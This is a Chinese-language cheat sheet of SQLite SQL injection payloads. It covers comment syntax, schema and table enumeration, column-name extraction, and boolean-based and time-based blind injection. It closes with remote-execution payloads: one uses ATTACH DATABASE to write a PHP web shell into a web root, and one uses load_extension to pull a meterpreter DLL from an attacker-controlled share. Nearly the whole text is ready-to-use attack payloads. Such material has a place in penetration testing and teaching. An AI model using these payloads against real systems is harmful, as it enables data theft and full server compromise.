  ##### 注释符
  	--
	/**/
  ##### 版本
	select sqlite_version();
  ##### 字符型注入 - 获取数据库结构
	SELECT sql FROM sqlite_schema
  ##### 整数/字符串型 - 提取表名
	SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
	使用limit X+1 offset X，提取所有表
  ##### 整数/字符串型 - 提取列名
	SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
	SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
  ##### 布尔类型 - 计算表数量
	and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
  ##### 布尔类型 - 枚举表名
	and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
  ##### 布尔类型 - 获取数据
	and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
  ##### 时间类型
	AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
  ##### 远程执行命令 - ATTACH DATABASE
	ATTACH DATABASE '/var/www/lol.php' AS lol;
	CREATE TABLE lol.pwn (dataz text);
	INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
  ##### 远程执行命令 - Load_extension
	UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
	默认情况下，此组件是禁用的